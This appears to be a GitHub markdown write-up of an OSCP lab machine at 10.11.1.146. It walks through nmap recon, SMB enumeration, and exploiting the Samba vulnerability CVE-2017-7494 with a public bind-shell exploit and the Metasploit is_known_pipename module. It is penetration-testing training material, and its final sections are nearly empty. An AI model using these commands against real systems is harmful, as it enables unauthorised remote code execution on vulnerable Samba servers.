# Susie OSCP Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -p- -sV -oA fulloscp_146 -T4 10.11.1.146``

![image](https://user-images.githubusercontent.com/123066149/232694983-90eab4ce-ea30-4a6d-b8ad-f8e9afe06711.png)

``nmap -sC -sV -oA oscp_146 -T4 10.11.1.146``

![image](https://user-images.githubusercontent.com/123066149/232695163-76739356-f0f6-420a-98cf-33bd6aff143f.png)

# ${{\color{purple}Initial Foothold}}\ $

``nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 10.11.1.146``

![image](https://user-images.githubusercontent.com/123066149/232695631-8e29419d-bf53-4f11-bec0-4cd6aa5cd75e.png)

``smbmap -H 10.11.1.146``

![image](https://user-images.githubusercontent.com/123066149/232695874-07a4235a-607d-4730-b313-5136f43e7d8a.png)

``searchsploit samba 4.5``

![image](https://user-images.githubusercontent.com/123066149/232696138-d6553032-0abf-4d2e-937b-ee5394af245b.png)

# ${{\color{purple}Exploitation}}\ $

### I used this exploit for the exploitation part :

https://github.com/opsxcq/exploit-CVE-2017-7494

![image](https://user-images.githubusercontent.com/123066149/232697136-b2ea7ad6-e702-4de9-a38d-3dc459545b96.png)

### I used this ressource for help me :

https://redteamzone.com/EternalRed/

![image](https://user-images.githubusercontent.com/123066149/232698850-ba6d7f77-73ad-4714-bc60-166966e32a65.png)

### I userd ``libbindshell-samba.so`` it's a bind shell on port 6699 :
### Susishare is the name of the share and ``/SusieShare/libbindshell-samba.so`` is a path of the .so payload
### User and pass are not important because it's no authentification share 

``python2.7 exploit.py -t 10.11.1.146 -e libbindshell-samba.so -s SusieShare -r /SusieShare/libbindshell-samba.so -u grest -p guest -P 6699``

### I don't have a shell with this methode :

![image](https://user-images.githubusercontent.com/123066149/232699367-1215ef49-253a-4687-b874-395372d75ad1.png)

### After trying different methods change the payload change the path of the executable I did not succeed to exploit it manually.
### I used metasploit and noticed that it was using an internal path :

``search samba``

``use exploit/linux/samba/is_known_pipename``

`` set RHOSTS 10.11.1.146``

``exploit``

![image](https://user-images.githubusercontent.com/123066149/232703390-5da2ceae-d84c-415c-a787-b170ce0fb0f2.png)

# ${{\color{purple}Privilege Escalation}}\ $

![image](https://user-images.githubusercontent.com/123066149/232703497-ab44b5f3-2e2c-4a5f-aef5-af4225a13910.png)

# ${{\color{purple}Points of Improvement}}\ $
